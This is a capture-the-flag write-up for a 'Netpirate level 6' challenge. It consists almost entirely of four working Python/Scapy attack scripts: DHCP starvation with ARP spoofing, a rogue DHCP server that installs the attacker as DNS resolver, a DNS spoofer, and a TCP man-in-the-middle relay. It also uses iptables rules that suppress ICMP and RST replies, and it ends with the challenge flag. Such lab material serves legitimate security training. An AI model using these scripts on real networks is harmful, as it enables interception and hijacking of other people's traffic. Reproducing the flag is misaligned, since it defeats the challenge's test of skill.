# Netpirate level 6 / DHCP starvation and DNS interception

**Author:** [KptCheeseWhiz](https://github.com/KptCheeseWhiz)

## Write-up

### Terminal 1

Starve the DHCP server, this part is optional since you can just be faster than the DHCP server 🤷.

```python
from scapy.all import *

from ipaddress import ip_network
from random import randint
from time import time

conf.checkIPaddr = False
hwaddr_entrypoint=get_if_hwaddr("eth0")

def arp_spoof(ip_target, ip_spoof, hw_attacker):
  send(
    ARP(
      op=2,
      pdst=ip_target,
      psrc=ip_spoof,
      hwdst=hw_attacker
    ), verbose=0
  )

def dhcp_starve():
  while True:
    # Use a MAC address starting with 'ca:fe' to distinguish real from fake requests
    hw_addr = str(RandMAC("ca:fe"))

    dhcp_discover = Ether(
      src=hw_addr,
      dst="ff:ff:ff:ff:ff"
    ) / IP(
      src="0.0.0.0",
      dst="255.255.255.255"
    ) / UDP(
      sport=68,
      dport=67
    ) / BOOTP(
      # Weird conversion? But internet says to use that
      chaddr=int(hw_addr.replace(":", ""), 16).to_bytes(6, "big"),
      xid=randint(1, 0xffffffff)
    ) / DHCP(
      options=[
        ("message-type", "discover"),
        "end"
      ]
    )

    dhcp_offer = srp1(dhcp_discover, timeout=1, verbose=0)
    # If we have no replies, the server is either overloaded or starved (both a good thing)
    if not dhcp_offer:
      continue

    dhcp_request = Ether(
      src=hw_addr,
      dst="ff:ff:ff:ff:ff"
    ) / IP(
      src="0.0.0.0",
      dst="255.255.255.255"
    ) / UDP(
      sport=68,
      dport=67
    ) / BOOTP(
      chaddr=dhcp_discover[BOOTP].chaddr,
      xid=dhcp_offer[BOOTP].xid
    ) / DHCP(
      options=[
        ("message-type", "request"),
        ("server_id", dhcp_offer[BOOTP].siaddr),
        ("requested_addr", dhcp_offer[BOOTP].yiaddr),
        ("hostname", dhcp_offer[BOOTP].yiaddr.replace(".", "_")),
        "end"
      ]
    )

    dhcp_ack = srp1(dhcp_request, timeout=5, verbose=0)
    if not dhcp_ack:
      print("[!] Failed to receive a DHCP acknowledgement, is something wrong?")
      continue

    arp_spoof(
      ip_target=dhcp_offer[BOOTP].siaddr,
      ip_spoof=dhcp_offer[BOOTP].yiaddr,
      hw_attacker=hwaddr_entrypoint
    )

    print(f"[+] Reserved {dhcp_offer[BOOTP].yiaddr} with {hw_addr} from {dhcp_offer[BOOTP].siaddr}")

print("[*] Starving DHCP servers")
dhcp_starve()
```

### Terminal 2

Steal the DHCP lease from our targets and inject our DNS server

```python
from scapy.all import *

from ipaddress import ip_network
import os

def system(cmd):
  from os import popen
  with popen(f"{cmd} 2>&1") as p:
    return p.read().strip()

hwaddr_entrypoint=get_if_hwaddr("eth0")
ipaddr_entrypoint=get_if_addr("eth0")
ipaddr_server3=system("getent hosts server3 | awk '{print $1}'")
network=ip_network(system("ip addr show eth0 | awk '/inet /{print $2}'"), strict=False)

def ip_addresses_generator():
  # Skip the first IP (gateway), our IP and the DHCP IP
  ip_addresses=[
    str(host) for host in network.hosts() if str(host) not in [ipaddr_entrypoint, ipaddr_server3]
  ][1:]
  ip_address_index = 0

  while True:
    yield ip_addresses[ip_address_index % len(ip_addresses)]
    ip_address_index = ip_address_index + 1

ip_addresses = ip_addresses_generator()
leases = {}

def sniff_dhcp(packet):
  if not packet.haslayer(DHCP):
    return

  # Avoid poisoning ourselves
  if packet[Ether].src.startswith("ca:fe"):
    return

  if packet[DHCP].options[0][1] == 1: # DHCP discover
    if packet[Ether].src not in leases:
      # Cycle through the available ip addresses
      ip_address = next(ip_addresses)
    else:
      ip_address = leases[packet[Ether].src]["ip_address"]

    print(f"[+] Offering {ip_address} to {packet[Ether].src}")
    sendp(
      Ether(
        src=hwaddr_entrypoint,
        dst=packet[Ether].src
      ) / IP(
        src=ipaddr_entrypoint,
        dst=ip_address
      ) / UDP(
        sport=67,
        dport=68
      ) / BOOTP(
        op=2,
        chaddr=packet[BOOTP].chaddr,
        xid=packet[BOOTP].xid,
        siaddr=ipaddr_entrypoint,
        yiaddr=ip_address,
      ) / DHCP(
        options=[
          ("message-type", "offer"),
          ("server_id", ipaddr_entrypoint),
          ("lease_time", 60000),
          ("renewal_time", 30000),
          ("rebinding_time", 52500),
          ("subnet_mask", str(network.netmask)),
          ("broadcast_address", str(network.broadcast_address)),
          # Put ourselves as the DNS server
          ("name_server", ipaddr_entrypoint),
          # The next host from the network is always the gateway
          ("router", str(next(network.hosts()))),
          "end"
        ]
      ), verbose=0
    )
  elif packet[DHCP].options[0][1] == 3: # DHCP request
    # Convert the scapy DHCP options to a dict
    dhcp_options = { k:v for k,v in [option for option in packet[DHCP].options if len(option) == 2] }
    if "requested_addr" not in dhcp_options or "hostname" not in dhcp_options:
      return

    leases[packet[Ether].src] = {
      "ip_address": dhcp_options["requested_addr"],
      "hostname": dhcp_options["hostname"]
    }
    with open("dhcp.leases", "w") as f:
      for k, v in leases.items():
        f.write(f"{k} {v['ip_address']} {v['hostname'].decode()}\n")

    print(f"[+] Acknowledged {dhcp_options['requested_addr']} for {packet[Ether].src}")
    sendp(
      Ether(
        src=hwaddr_entrypoint,
        dst=packet[Ether].src
      ) / IP(
        src=ipaddr_entrypoint,
        dst=dhcp_options["requested_addr"]
      ) / UDP(
        sport=67,
        dport=68
      ) / BOOTP(
        op=2,
        chaddr=packet[BOOTP].chaddr,
        xid=packet[BOOTP].xid,
        siaddr=ipaddr_entrypoint,
        yiaddr=dhcp_options["requested_addr"],
      ) / DHCP(
        options=[
          ("message-type", "ack"),
          ("server_id", ipaddr_entrypoint),
          ("lease_time", 60000),
          ("renewal_time", 30000),
          ("rebinding_time", 52500),
          ("subnet_mask", str(network.netmask)),
          ("broadcast_address", str(network.broadcast_address)),
          # Put ourselves as the DNS server
          ("name_server", ipaddr_entrypoint),
          # The next host from the network is always the gateway
          ("router", str(next(network.hosts()))),
          "end"
        ]
      ), verbose=0
    )
  elif packet[DHCP].options[0][1] == 7: # DHCP release
    if packet[Ether].src not in leases:
      return

    del leases[packet[Ether].src]
    with open("dhcp.leases", "w") as f:
      for k, v in leases.items():
        f.write(f"{k} {v['ip_address']} {v['hostname']}\n")

    print(f"[+] Released {packet[IP].src} for {packet[Ether].src}")

# Remove old leases file
if os.path.exists("dhcp.leases"):
  os.remove("dhcp.leases")

print("[*] Replying to DHCP requests")
sniff(prn=sniff_dhcp, filter="udp and (port 67 or port 68)", store=False)
```

### Terminal 3

Reply to DNS queries with our server as the IP

```python
from scapy.all import *

import socket

def system(cmd):
  from os import popen
  with popen(f"{cmd} 2>&1") as p:
    return p.read().strip()

ipaddr_entrypoint=get_if_addr("eth0")
hwaddr_entrypoint=get_if_hwaddr("eth0")

def sniff_dns(packet):
  if not packet.haslayer(DNSQR):
    return

  # Ignore our own packets
  if packet[Ether].src == hwaddr_entrypoint:
    return

  sendp(
    Ether(
      src=hwaddr_entrypoint,
      dst=packet[Ether].src
    ) /
    IP(
      src=packet[IP].dst,
      dst=packet[IP].src
    ) /
    UDP(
      dport=packet[UDP].sport,
      sport=packet[UDP].dport
    ) /
    DNS(
      id=packet[DNS].id,
      qd=packet[DNS].qd,
      aa=1,
      rd=0,
      qr=1,
      qdcount=1,
      ancount=1,
      nscount=0,
      arcount=0,
      ar=DNSRR(
          rrname=packet[DNS].qd.qname,
          type="A",
          ttl=600,
          # Put our IP as the response
          rdata=ipaddr_entrypoint
        )
    ), verbose=0
  )

  print(f"[+] Replied to a DNS request for '{packet[DNS].qd.qname[:-1].decode()}' from {packet[IP].src}")

# Block destination unreachable icmp packets
system(f"iptables -I OUTPUT -p icmp --icmp-type destination-unreachable -s {ipaddr_entrypoint} -j DROP")
try:
  print("[*] Replying to DNS requests")
  sniff(prn=sniff_dns, filter="udp and port 53", store=False)
finally:
  system(f"iptables -D OUTPUT -p icmp --icmp-type destination-unreachable -s {ipaddr_entrypoint} -j DROP")
```

### Terminal 4

Listen for TCP traffic to receive the flag.

```python
from scapy.all import *
from time import time
from os import path

def system(cmd):
  from os import popen
  with popen(f"{cmd} 2>&1") as p:
    return p.read().strip()

ipaddr_entrypoint=get_if_addr("eth0")
hwaddr_entrypoint=get_if_hwaddr("eth0")

tcp_marks = {}
forward_table = {
  "server1": "server2",
  "server2": "server1"
}

def sniff_tcp(packet):
  # Ignore packets from ourselve
  if packet[Ether].src == hwaddr_entrypoint:
    return

  # We do not have leases yet..
  if not path.exists("dhcp.leases"):
    return

  # Load our lease table
  leases = []
  with open("dhcp.leases", "r") as f:
    for line in f:
      mac, ip_address, hostname = line.strip().split(" ")
      leases.append({
        "hw_address": mac,
        "ip_address": ip_address,
        "hostname": hostname
      })

  # Try to find where to forward the packets
  lease_from = next((lease for lease in leases if lease["hw_address"] == packet[Ether].src), None)
  if not lease_from:
    return

  if lease_from["hostname"] not in forward_table:
    return

  lease_fwrd = next((lease for lease in leases if lease["hostname"] == forward_table[lease_from["hostname"]]), None)
  if not lease_fwrd:
    return

  ipaddr_fw, hwaddr_fw = lease_fwrd["ip_address"], lease_fwrd["hw_address"]

  # Avoid reforwarding packets already forwarded
  tcp_mark = f"{packet[TCP].seq}:{packet[TCP].flags}"
  if tcp_mark in tcp_marks:
    return
  tcp_marks[tcp_mark] = time()

  # Print flag contained in the packets
  if packet.haslayer(Raw):
    data = packet[Raw].load.decode().strip()
    if data.startswith("flag-"):
      print(f"[+] {data}")

  # Clear the TCP checksum to let scapy calculate the right one
  del packet[TCP].chksum

  # Send the packet with correct Ether and IP layers
  sendp(
    Ether(
      src=hwaddr_entrypoint,
      dst=hwaddr_fw
    ) /
    IP(
      src=ipaddr_entrypoint,
      dst=ipaddr_fw
    ) /
    packet[TCP],
    verbose=0
  )

# Block the kernel from sending RST/Port closed packets
system(f"iptables -I OUTPUT -p tcp --tcp-flags RST RST -s {ipaddr_entrypoint} -j DROP")
try:
  print(f"[*] Sniffing TCP packets")
  sniff(prn=sniff_tcp, filter="tcp", store=False)
finally:
  system(f"iptables -D OUTPUT -p tcp --tcp-flags RST RST -s {ipaddr_entrypoint} -j DROP")
```

## Flag

`flag-0b3960ff20e75f9892bb9362cbe6ad18567d1099e5a7fa194b8a7d6f9d6fd15c`
